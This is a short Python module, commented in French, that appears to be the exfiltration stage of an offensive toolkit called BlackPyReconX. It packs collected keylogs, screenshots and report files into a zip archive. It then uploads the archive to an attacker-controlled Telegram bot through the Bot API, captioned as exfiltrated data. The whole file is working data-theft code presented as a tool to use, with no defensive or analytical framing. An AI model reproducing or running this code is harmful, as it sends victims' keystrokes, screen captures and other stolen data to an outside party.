# modules/exfiltration.py

import os
import zipfile
from datetime import datetime
import requests  # ← Nécessaire pour envoyer via Telegram

OUTPUT_DIR = "outputs"
ARCHIVE_NAME = os.path.join(OUTPUT_DIR, "exfiltrated.zip")

def create_zip():
    print("[*] Création de l'archive à exfiltrer...")

    with zipfile.ZipFile(ARCHIVE_NAME, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for folder_name in ['keylogs', 'screenshots']:
            folder_path = os.path.join(OUTPUT_DIR, folder_name)
            if os.path.exists(folder_path):
                for root, _, files in os.walk(folder_path):
                    for file in files:
                        full_path = os.path.join(root, file)
                        arcname = os.path.relpath(full_path, OUTPUT_DIR)
                        zipf.write(full_path, arcname)

        for file in ["rapport_final.txt", "rapport_final.html", "rapport_final.pdf"]:
            path = os.path.join(OUTPUT_DIR, file)
            if os.path.exists(path):
                zipf.write(path, os.path.basename(path))

    print(f"[+] Archive créée : {ARCHIVE_NAME}")
    return ARCHIVE_NAME

# 🔁 Tu ajoutes ta fonction ici :
def send_via_telegram(config, file_path):
    print("[*] Envoi de l'archive via Telegram...")
    token = config.get("telegram_bot_token")
    chat_id = config.get("telegram_chat_id")

    if not token or not chat_id:
        print("[!] Token ou chat_id Telegram manquant dans config.json")
        return False

    try:
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': chat_id, 'caption': '📦 Données exfiltrées depuis BlackPyReconX'}
            r = requests.post(url, files=files, data=data)
            if r.status_code == 200:
                print("[+] Envoi Telegram réussi ✅")
                return True
            else:
                print(f"[!] Échec Telegram : {r.text}")
    except Exception as e:
        print(f"[!] Erreur Telegram : {e}")
    return False

# 🚀 Point d’entrée appelé depuis main.py
def run(config):
    zip_path = create_zip()
    send_via_telegram(config, zip_path)


